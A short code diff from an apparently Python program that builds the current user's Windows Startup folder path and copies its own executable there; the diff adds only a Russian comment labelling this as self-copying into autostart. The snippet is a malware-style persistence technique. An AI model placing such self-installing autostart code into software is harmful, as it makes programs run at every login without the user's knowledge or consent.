@@ -27,6 +27,7 @@ current_file  = executable
 username = GetUserName()
 srcautostart = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filenamebase}'
 
+#САМОКОПИРОВАНИЕ В АВТОЗАПУСК
 try:
     if current_file != srcautostart:
         copy(executable, srcautostart)
